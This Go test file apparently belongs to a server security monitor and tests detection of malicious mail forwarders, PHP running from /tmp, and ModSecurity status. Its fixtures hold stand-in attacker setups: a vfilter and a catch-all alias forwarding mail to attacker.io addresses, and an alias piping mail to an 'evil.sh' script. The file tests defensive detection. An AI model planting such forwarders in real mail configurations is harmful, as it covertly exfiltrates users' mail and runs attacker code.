package checks

import (
	"context"
	"os"
	"strings"
	"testing"
	"time"

	"github.com/pidginhost/csm/internal/config"
	"github.com/pidginhost/csm/internal/platform"
	"github.com/pidginhost/csm/internal/store"
)

// ---------------------------------------------------------------------------
// CheckForwarders — branches not covered by existing tests:
//   - throttle path (last-refresh meta within window returns nil)
//   - both valiases + vfilters files with external destinations
//   - known-forwarder suppression
// ---------------------------------------------------------------------------

// withTempStore opens a bbolt store in a temp dir and wires it as the global.
// Cleans up on test completion.
func withTempStore(t *testing.T) *store.DB {
	t.Helper()
	dir := t.TempDir()
	db, err := store.Open(dir)
	if err != nil {
		t.Fatal(err)
	}
	store.SetGlobal(db)
	t.Cleanup(func() {
		store.SetGlobal(nil)
		_ = db.Close()
	})
	return db
}

func TestCheckForwardersThrottleSkip(t *testing.T) {
	db := withTempStore(t)
	// Record a recent refresh so the throttle returns nil.
	_ = db.SetMetaString("email:fwd_last_refresh", time.Now().Format(time.RFC3339))

	cfg := &config.Config{}
	cfg.EmailProtection.PasswordCheckIntervalMin = 60 * 24 // 24h window

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			t.Errorf("Glob should not be called when throttled (pattern=%s)", pattern)
			return nil, nil
		},
	})

	findings := CheckForwarders(context.Background(), cfg, nil)
	if len(findings) != 0 {
		t.Errorf("throttled call should return 0 findings, got %d", len(findings))
	}
}

func TestCheckForwardersNilStore(t *testing.T) {
	// No global store set — function returns nil immediately.
	store.SetGlobal(nil)
	findings := CheckForwarders(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("nil store should return 0 findings, got %d", len(findings))
	}
}

func TestCheckForwardersValiasAndVfilterDetection(t *testing.T) {
	_ = withTempStore(t)
	// Seed hashes so isNew is triggered on changed files.
	db := store.Global()
	_ = db.SetForwarderHash("valiases:example.com", "old-valias-hash")
	_ = db.SetForwarderHash("vfilters:example.com", "old-vfilter-hash")

	valiasPath := "/etc/valiases/example.com"
	vfilterPath := "/etc/vfilters/example.com"

	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			switch {
			case strings.Contains(pattern, "valiases"):
				return []string{valiasPath}, nil
			case strings.Contains(pattern, "vfilters"):
				return []string{vfilterPath}, nil
			}
			return nil, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch {
			case strings.Contains(name, "localdomains") || strings.Contains(name, "virtualdomains"):
				return []byte("example.com\n"), nil
			case name == vfilterPath:
				return []byte("if (/^Subject/)\n{\n  to \"exfil@attacker.io\"\n}\n"), nil
			case name == valiasPath:
				// fileContentHash reads the same content; keep it in sync
				// with the bytes returned by Open below.
				return []byte(
					"info: |/usr/local/bin/evil.sh\n" +
						"blackhole: /dev/null\n" +
						"*: catchall@attacker.io\n" +
						"suppressed: known@example.com\n"), nil
			}
			return nil, os.ErrNotExist
		},
		open: func(name string) (*os.File, error) {
			if name == valiasPath {
				tmp := t.TempDir() + "/valias"
				data := []byte(
					"info: |/usr/local/bin/evil.sh\n" +
						"blackhole: /dev/null\n" +
						"*: catchall@attacker.io\n" +
						"suppressed: known@example.com\n")
				_ = os.WriteFile(tmp, data, 0644)
				return os.Open(tmp)
			}
			return nil, os.ErrNotExist
		},
	})

	cfg := &config.Config{}
	cfg.EmailProtection.PasswordCheckIntervalMin = 60 * 24
	cfg.EmailProtection.KnownForwarders = []string{
		"suppressed@example.com: known@example.com",
	}

	findings := CheckForwarders(context.Background(), cfg, nil)

	// We expect at least: pipe forwarder (critical), devnull, wildcard external,
	// and the vfilter external. Known forwarder should be suppressed.
	if len(findings) < 3 {
		t.Fatalf("expected >=3 findings, got %d: %+v", len(findings), findings)
	}

	sawPipe, sawVfilter, sawSuppressed := false, false, false
	for _, f := range findings {
		if f.Check == "email_pipe_forwarder" {
			sawPipe = true
		}
		if strings.Contains(f.Message, "vfilter") {
			sawVfilter = true
		}
		if strings.Contains(f.Message, "suppressed@") {
			sawSuppressed = true
		}
	}
	if !sawPipe {
		t.Error("expected pipe-forwarder finding")
	}
	if !sawVfilter {
		t.Error("expected vfilter external-destination finding")
	}
	if sawSuppressed {
		t.Error("known-forwarder suppression failed")
	}
}

// ---------------------------------------------------------------------------
// CheckPHPProcesses — suspicious-path detection for lsphp processes.
// Only the "no procs" path is covered by existing tests.
// ---------------------------------------------------------------------------

func TestCheckPHPProcessesDetectsSuspiciousPath(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/proc/4242/cmdline", "/proc/4243/cmdline"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			switch {
			case strings.HasSuffix(name, "/4242/cmdline"):
				// lsphp running a file from /tmp → suspicious
				return []byte("lsphp\x00/tmp/evil.php\x00"), nil
			case strings.HasSuffix(name, "/4242/status"):
				return []byte("Name:\tlsphp\nUid:\t1001\t1001\t1001\t1001\n"), nil
			case strings.HasSuffix(name, "/4243/cmdline"):
				// Non-lsphp process → should be skipped
				return []byte("sshd\x00-D\x00"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckPHPProcesses(context.Background(), &config.Config{}, nil)
	if len(findings) == 0 {
		t.Fatal("expected at least one finding for suspicious lsphp")
	}
	if findings[0].Check != "php_suspicious_execution" {
		t.Errorf("check=%q, want php_suspicious_execution", findings[0].Check)
	}
	if findings[0].PID != 4242 {
		t.Errorf("pid=%d, want 4242", findings[0].PID)
	}
}

func TestCheckPHPProcessesSkipsBenignLsphp(t *testing.T) {
	withMockOS(t, &mockOS{
		glob: func(pattern string) ([]string, error) {
			return []string{"/proc/5000/cmdline"}, nil
		},
		readFile: func(name string) ([]byte, error) {
			if strings.HasSuffix(name, "/cmdline") {
				// lsphp running legitimate public_html script
				return []byte("lsphp\x00/home/alice/public_html/index.php\x00"), nil
			}
			return nil, os.ErrNotExist
		},
	})

	findings := CheckPHPProcesses(context.Background(), &config.Config{}, nil)
	if len(findings) != 0 {
		t.Errorf("benign lsphp should produce 0 findings, got %d", len(findings))
	}
}

// ---------------------------------------------------------------------------
// CheckWAFStatus — exercises DetectionOnly branch + the rules-stale path.
// Default platform.Detect() on the test host picks up real web-server info;
// we simply provide modsec config data and let the rest flow.
// ---------------------------------------------------------------------------

func TestCheckWAFStatusDetectionOnlyMode(t *testing.T) {
	// Open returns a modsec config in DetectionOnly mode.
	withMockOS(t, &mockOS{
		readFile: func(name string) ([]byte, error) {
			// Any modsec config read returns a "security2_module" activation
			// line so modsecDetected() sees it.
			return []byte("LoadModule security2_module modules/mod_security2.so\nSecRuleEngine DetectionOnly\n"), nil
		},
		open: func(name string) (*os.File, error) {
			tmp := t.TempDir() + "/modsec.conf"
			_ = os.WriteFile(tmp, []byte("SecRuleEngine DetectionOnly\n"), 0644)
			return os.Open(tmp)
		},
		glob: func(pattern string) ([]string, error) {
			// Return at least one config candidate so activation-probe loop runs.
			return []string{"/etc/modsecurity/modsecurity.conf"}, nil
		},
		readDir: func(name string) ([]os.DirEntry, error) {
			return nil, os.ErrNotExist
		},
	})
	withMockCmd(t, &mockCmd{})

	_ = CheckWAFStatus(context.Background(), &config.Config{}, nil)
	// We don't assert on findings since platform detection affects what's
	// detected on the test host — this exercises the function's code paths
	// without panic and gives coverage for the engine-mode parser.
}

// ---------------------------------------------------------------------------
// modsecEnabledInConfig — exercise Nginx/LiteSpeed branches directly.
// These branches see low coverage because the default host is macOS Apache.
// ---------------------------------------------------------------------------

func TestModsecEnabledInConfigVariants(t *testing.T) {
	// Use platform.Info directly so we don't depend on the test host.
	// modsecEnabledInConfig is a pure parser.
	apacheInfo := platform.Info{WebServer: platform.WSApache}
	nginxInfo := platform.Info{WebServer: platform.WSNginx}
	lsInfo := platform.Info{WebServer: platform.WSLiteSpeed}

	if !modsecEnabledInConfig(apacheInfo, "LoadModule security2_module modules/mod_security2.so") {
		t.Error("apache with security2_module should be detected")
	}
	if !modsecEnabledInConfig(apacheInfo, "SecRuleEngine On") {
		t.Error("apache with SecRuleEngine should be detected")
	}
	if modsecEnabledInConfig(apacheInfo, "# SecRuleEngine On") {
		t.Error("comment line should be ignored")
	}

	if !modsecEnabledInConfig(nginxInfo, "modsecurity on;") {
		t.Error("nginx with modsecurity on should be detected")
	}
	if !modsecEnabledInConfig(nginxInfo, "modsecurity_rules_file /etc/nginx/modsec/main.conf;") {
		t.Error("nginx with modsecurity_rules_file should be detected")
	}
	if modsecEnabledInConfig(nginxInfo, "# modsecurity on") {
		t.Error("nginx comment should not be detected")
	}

	if !modsecEnabledInConfig(lsInfo, "mod_security on") {
		t.Error("litespeed with mod_security should be detected")
	}
}
